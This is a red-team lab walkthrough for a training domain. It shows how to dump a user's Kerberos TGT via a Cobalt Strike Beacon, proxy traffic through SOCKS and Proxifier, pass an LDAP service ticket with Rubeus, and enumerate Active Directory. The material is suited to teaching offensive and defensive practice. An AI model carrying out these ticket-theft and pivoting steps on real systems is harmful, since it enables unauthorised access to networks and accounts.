# SOCKS Pivoting Lab

>The objective for this lab is to obtain an LDAP service ticket and use it to impersonate a user over a SOCKS proxy for the purposes of domain enumeration.

===

## Dump TGT

1. Launch Cobalt Strike and connect to the team server.
2. Interact with the SYSTEM Beacon.
3. Dump the TGT for rsteel.

⚠️ You should know how to do this from the User Impersonation chapter/lab.

⚠️ Open Notepad or VSCode to store a copy of the encoded ticket.

## SOCKS

1. Start a SOCKS proxy.
    1.  `socks 1080 socks5 ` 

⚠️ SOCKS does not require local admin or SYSTEM access, so you can do this on the medium-integrity Beacon if you wish.

1. The Cobalt Strike client is no longer required, so can be minimised.

===

## DNS

1. On the Attacker Desktop, run Terminal as an administrator.
2. Add static DNS records for *lon-dc-1* and *contoso.com*:

	```PowerShell
    Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
    ```

## Proxifier

1. From the Windows start menu, launch Profixier.
2. It opens minimised in the taskbar, so click it to open the full window.

### Proxy Server

3. Add the team server as a new proxy server:
    1. **Profile > Proxy Servers**
    2. Click **Add**.
    3. Address:  `10.0.0.5 `
    4. Port:  `1080 `
    5. Protocol: **SOCKS Version 5**
    6. Click **OK**.
    
⚠️ A box will appear asking if you want to use this proxy by default. Click **No**.

    6. Click **OK** again.
    
⚠️ Another box will appear asking if you want to edit Proxification Rules.  Click **Yes**.

### Proxification Rules

1. Add a new rule that will proxy any traffic from any application, on any port destined for the target network, through the team server.
    1. Click **Add**.
    2. Name: **Beacon**
    3. Target hosts:  `10.10.120.0/23 `
    4. Action: **Proxy SOCKS5 10.0.0.5**
    5. Click **OK**.
    6. Click **OK** again.

===

## LDAP Service Ticket

1. From Terminal, run a new netonly PowerShell process.
    1.  `runas /netonly /user:CONTOSO\rsteel powershell.exe `
    2. Password:  `FakePass `

2. Use the user's TGT to request a service ticket for LDAP and pass it into the current session.

	```PowerShell-nocolor
    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
    ```

3. The native klist command won't work here, so verify the ticket using Rubeus.
    
    ```PowerShell-nocolor
    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
    ```

## Domain Enumeration

1. Use the native AD RSAT cmdlets to query the domain.
    1.  `Get-ADComputer -Filter * -Server lon-dc-1 `
    2.  `Get-ADUser -Filter * -Server lon-dc-1 `
    3.  `Get-ADOrganizationalUnit -Filter * -Server lon-dc-1 `

⚠️ In this lab, you have learned how to request service tickets and perform domain enumeration through a SOCKS proxy.
